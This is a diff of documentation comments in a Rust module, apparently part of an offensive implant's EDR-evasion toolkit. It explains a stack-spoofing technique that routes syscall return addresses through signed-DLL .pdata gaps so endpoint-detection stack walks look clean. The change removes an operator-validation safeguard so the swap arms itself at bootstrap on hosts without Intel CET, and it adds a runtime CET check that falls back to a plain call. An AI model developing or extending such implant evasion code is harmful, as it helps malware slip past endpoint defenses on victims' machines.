@@ -14,41 +14,21 @@
 //! the **return address** is implant-allocated — that second half is what stack
 //! spoofing closes.
 //!
-//! ## CET safety — TWO distinct layers (read before enabling the swap)
-//! The gap/leaf-bridge technique is CET-safe **at the detection layer only**.
-//! The two layers must not be conflated:
+//! ## CET safety — runtime gate, not a repair seam
 //!
-//! 1. **Unwinder-walk / detection layer — CET-SAFE.** EDR stack-walk sensors
-//!    and exception dispatch drive unwinding through `RtlVirtualUnwind` /
-//!    `RtlLookupFunctionEntry`, a *metadata* system that does NOT consult the
-//!    Intel CET shadow stack. For an address with no `.pdata` coverage (a
-//!    `.pdata` gap), `RtlLookupFunctionEntry` returns NULL and the unwinder
-//!    treats it as a **leaf function**: RSP += 8, no `UNWIND_INFO` parse, no
-//!    shadow-stack touch. A chain of leaf-gap addresses therefore reads as a
-//!    clean, CET-irrelevant synthetic chain to any stack-walk sensor — this is
-//!    the gap/leaf technique's value.
+//! The gap/leaf-bridge technique is CET-safe **at the stack-walk detection
+//! layer**: EDR unwinders (`RtlVirtualUnwind` / `RtlLookupFunctionEntry`) treat
+//! `.pdata`-gap addresses as leaf functions (RSP += 8, no shadow-stack touch),
+//! so a chain of leaf gaps reads as a clean synthetic chain.
 //!
-//! 2. **`ret` execution layer — NOT CET-safe by a blind swap.** Intel CET /
-//!    the Windows kernel shadow stack acts at **every `ret`**: the CPU pops
-//!    from RSP *and* from the shadow stack and faults (`#CP`,
-//!    `KiControlProtectionFault`) on mismatch. A naive swap that moves RSP onto
-//!    a fake chain and lets `f`'s `ret` pop a gap address will **fault on
-//!    CET-on hosts**, because those gap addresses were never pushed onto the
-//!    real shadow stack by a real `call`. The leaf-gap property helps layer 1,
-//!    not layer 2.
-//!
-//! **Therefore the live swap, when emitted, MUST route through the CET repair
-//! seam** (Synacktiv SSTIC 2025, addendum §7.2): `KiControlProtectionFault` is
-//! *lenient* — it walks the shadow stack and, if any stored return address
-//! matches the RSP-popped one, repairs the shadow stack via
-//! `VslKernelShadowStackAssist` instead of bug-checking. The correct swap drives
-//! the frame transition through an exception/`RtlRestoreContext` path that
-//! engages that repair, OR probes CET at runtime and degrades to the
-//! swap-disabled floor on CET-on hosts. **Do NOT emit a plain
-//! `mov rsp / call / ret` swap** — it is a `#CP` time-bomb on future CET-default
-//! hosts. (User-mode CET is opt-in per-process today, Win11 24H2; the window is
-//! closing.) This is why the swap is gated OFF until that seam is implemented
-//! and target-debugged.
+//! At the `ret` **execution layer**, Intel CET shadow stacks fault (`#CP`) if
+//! the popped return address doesn't match the shadow stack. A plain
+//! `mov rsp / call / ret` swap would fault on CET-on hosts. **This module does
+//! NOT attempt a `#CP` repair seam** (no `KiControlProtectionFault` /
+//! `RtlRestoreContext` VEH). Instead, it uses a runtime `should_execute()` gate:
+//! `cet_active()` (via `IsProcessorFeaturePresent(PF_SMET_CET_SHADOW_STACKS)`)
+//! is probed at every call; when CET is detected, the swap degrades to a direct
+//! `f()` call (no spoofing). On CET-off hosts the swap runs normally.
 //!
 //! ## Single-source-of-truth
 //! The frame-chain *math* lives ONLY in `nyx-implant-evasionsdk::frame`
@@ -72,13 +52,11 @@ const BRIDGE_DEPTH: usize = 8;
 /// Master switch for the RSP swap. When armed (true), the BYOUD-Gap leaf-bridge
 /// chain is staged at init and the swap executes on every syscall, making the
 /// caller's return address resolve to a signed-DLL .pdata gap instead of an
-/// implant address. **Defaults OFF** — must be explicitly armed after target-side
-/// live debugging confirms CET-off status and gap usability. On CET-on hosts
-/// (Intel TGL+, Win11 24H2+, BIOS CET enabled) the swap would fault with
-/// `#CP` (Control Protection Fault) because the fake stack's return addresses
-/// were never pushed onto the shadow stack. The CET-aware seam (should_execute
-/// gate) provides runtime degradation, but this default ensures no swap fires
-/// until the operator validates the target.
+/// implant address. **Auto-armed at bootstrap** on CET-off hosts with usable
+/// `.pdata` gaps. On CET-on hosts the runtime `should_execute()` gate degrades
+/// to a direct call (no spoofing). The static default is `false`, but
+/// `entry::bootstrap()` calls `set_swap_enabled(true)` when
+/// `swap::decide(cet_on, gaps_usable) == Execute`.
 static SPOOF_SWAP_ENABLED: AtomicBool = AtomicBool::new(false);
 
 /// Enable/disable the RSP swap at runtime. Call from a selftest or operator
@@ -208,7 +186,7 @@ pub fn last_staged_depth() -> usize {
 
 /// Hot-path hook point the syscall wrappers call. Stages a chain from the
 /// installed global pool (if any) and — ONLY when [`swap_enabled`] is true and
-/// the CET-aware seam is in place — wraps `f` in the spoofed-stack scope.
+/// the runtime CET gate (`should_execute`) allows — wraps `f` in the spoofed-stack scope.
 ///
 /// With no pool installed OR the swap disabled (the default), this is a direct
 /// call to `f` with zero staging overhead. When the pool is installed AND swap
